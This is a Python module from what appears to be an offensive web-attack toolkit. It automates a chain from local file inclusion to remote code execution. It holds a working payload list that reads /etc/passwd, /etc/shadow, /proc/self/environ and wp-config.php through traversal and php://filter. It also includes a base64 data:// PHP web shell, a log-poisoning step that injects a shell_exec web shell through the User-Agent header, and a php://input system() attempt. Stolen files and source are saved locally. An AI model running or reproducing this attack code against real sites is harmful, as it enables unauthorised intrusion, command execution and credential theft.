"""
 20. web_lfi_rce — LFI → log poisoning → RCE, /proc/self/environ, php://filter.
"""
import base64
import re
from urllib.parse import quote_plus

from Design.colors_cli import console, escape
from modules.attack_config import AttackConfig
from modules.attacks.web_exploits import _req, _param_url
from modules.attacks.progress import found, fail, warn, section, explain, req_log
from modules.downloads import save_text


LFI_PATHS = [
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\etc\\\\passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "../../../../etc/shadow",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/proc/net/tcp",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/usr/local/apache/log/access_log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=wp-config.php",
    "php://filter/read=string.rot13/resource=index",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "C:\\Windows\\win.ini",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
]

LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/usr/local/apache/log/access_log",
    "/var/log/vsftpd.log",
    "/var/log/mail.log",
    "/proc/self/environ",
]

LOG_POISON = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>'; } ?>"
DEFAULT_PARAMS = ["file", "page", "view", "template", "path", "include", "load", "read", "dir", "document", "f", "p"]


def run_web_lfi_rce(target, config):
    console.print(f"\n[bold primary][ LFI → RCE CHAIN ][/bold primary]\n")
    explain(
        "Local File Inclusion (LFI) lets attackers read files outside the webroot\n"
        "via path traversal (../../../../etc/passwd) or PHP wrappers (php://filter).\n"
        "Phase 1: Test all params for LFI using 28 payloads.\n"
        "Phase 2: Log poisoning — inject PHP into access log via User-Agent, then include the log.\n"
        "Phase 3: php://input direct RCE attempt.\n"
        f"Testing {len(LFI_PATHS)} payloads × {len(DEFAULT_PARAMS)} params = {len(LFI_PATHS)*len(DEFAULT_PARAMS)} probes."
    )

    params = [p.strip() for p in (config.http_params or ",".join(DEFAULT_PARAMS)).split(",")]
    path = config.http_path or "/"
    tls = config.http_use_tls
    h, p_port = target.host, target.port

    lfi_found = []
    total_tested = 0

    section("Phase 1 — LFI Detection")
    for param in params:
        console.print(f"\n  [muted]Testing param:[/muted] [text]{param}[/text] ({len(LFI_PATHS)} payloads)")
        for i, lfi_path in enumerate(LFI_PATHS, 1):
            total_tested += 1
            url = _param_url(path, param, lfi_path)
            console.print(f"  [dim]  [{i:>2}/{len(LFI_PATHS)}] {escape(lfi_path[:60])}[/dim]", end="\r")
            resp = _req(h, p_port, tls, url)
            if not resp:
                continue

            body = resp["body"].decode("utf-8", "replace")
            status = resp["status"]

            if "root:x:0:0" in body or "root:*:0:0" in body or "daemon:x:" in body:
                console.print()
                found("LFI — /etc/passwd readable!", f"param={param} payload={lfi_path[:50]}")
                save_text(body, f"lfi_{param}_passwd.txt", host=target.host, subdir="web")
                lfi_found.append((param, lfi_path))

            elif "[extensions]" in body or "[fonts]" in body or "[mci extensions]" in body.lower():
                console.print()
                found("LFI — win.ini readable!", f"param={param} payload={lfi_path[:50]}")
                lfi_found.append((param, lfi_path))

            elif "HTTP_HOST" in body or "DOCUMENT_ROOT" in body or "HTTP_USER_AGENT" in body:
                console.print()
                found("LFI — /proc/self/environ readable!", f"param={param}")
                lfi_found.append((param, lfi_path))

            elif "php://filter" in lfi_path and status == 200 and resp["size"] > 50:
                m = re.search(r"([A-Za-z0-9+/]{80,}={0,2})", body)
                if m:
                    try:
                        decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
                        if "<?php" in decoded or "<?=" in decoded:
                            console.print()
                            found("PHP source exfiltrated via php://filter!", f"param={param}")
                            save_text(decoded, f"lfi_source_{param}.php", host=target.host, subdir="web")
                            lfi_found.append((param, lfi_path))
                    except Exception:
                        pass

    console.print()  # clear \r line
    console.print(f"  [muted]LFI phase: tested {total_tested} probes — {len(lfi_found)} LFI confirmed[/muted]")

    section("Phase 2 — Log Poisoning → RCE")
    console.print(f"  [dim]Step 1/2: Injecting PHP payload into log via User-Agent header…[/dim]")
    poison_resp = _req(h, p_port, tls, path, headers={"User-Agent": LOG_POISON, "Connection": "close"})
    if poison_resp:
        req_log("GET", path, poison_resp["status"], note="User-Agent=PHP shell injected")
    else:
        console.print("  [dim]  Poison request sent (no response)[/dim]")

    console.print(f"  [dim]Step 2/2: Including log files with ?cmd=id on {len(LOG_PATHS)} paths…[/dim]")
    rce_found = False
    for log_path in LOG_PATHS:
        for param in params:
            sep = "&" if "?" in path else "?"
            url = f"{path}{sep}{param}={quote_plus(log_path)}&cmd=id"
            console.print(f"  [dim]  → ?{param}={log_path[:40]}&cmd=id[/dim]", end="\r")
            r = _req(h, p_port, tls, url)
            if not r:
                continue
            body_text = r["body"].decode("utf-8", "replace")
            if re.search(r"uid=\d+\(\w+\)", body_text):
                console.print()
                found("RCE via log poisoning!", f"log={log_path} param={param}")
                save_text(body_text, f"lfi_rce_{param}.txt", host=target.host, subdir="web")
                rce_found = True
                break
        if rce_found:
            break
    console.print()

    section("Phase 3 — php://input RCE")
    console.print("  [dim]Posting PHP code directly via php://input wrapper…[/dim]")
    for param in params:
        url = _param_url(path, param, "php://input")
        req_log("POST", f"...?{param}=php://input", note="body=<?php system('id'); ?>")
        r = _req(h, p_port, tls, url, method="POST",
                 headers={"Content-Type": "application/x-www-form-urlencoded",
                          "User-Agent": "Mozilla/5.0"},
                 body=b"<?php system('id'); ?>")
        if r:
            body_text = r["body"].decode("utf-8", "replace")
            if re.search(r"uid=\d+", body_text):
                found("RCE via php://input!", f"param={param}")
                save_text(body_text, f"phpinput_rce_{param}.txt", host=target.host, subdir="web")
                rce_found = True
                break

    if not lfi_found and not rce_found:
        fail("No LFI or RCE found", f"tested {total_tested} payloads across {len(params)} params")
    elif lfi_found and not rce_found:
        warn(f"LFI confirmed but log poisoning RCE not achieved ({len(lfi_found)} LFI path(s) found)")

    # Save full attack report
    try:
        from modules.reporter import save_attack_report
        findings_list = [f"LFI: {param}={path}" for param, path in lfi_found]
        if rce_found:
            findings_list.append("RCE via log poisoning / php://input confirmed")
        rp = save_attack_report(
            host=target.host, attack_name="lfi_rce",
            target_info=f"HTTP {target.host}:{target.port}{path}",
            findings=findings_list,
            requests_made=total_tested,
        )
        console.print(f"  [muted]Report saved:[/muted] [text]{rp}[/text]")
    except Exception:
        pass
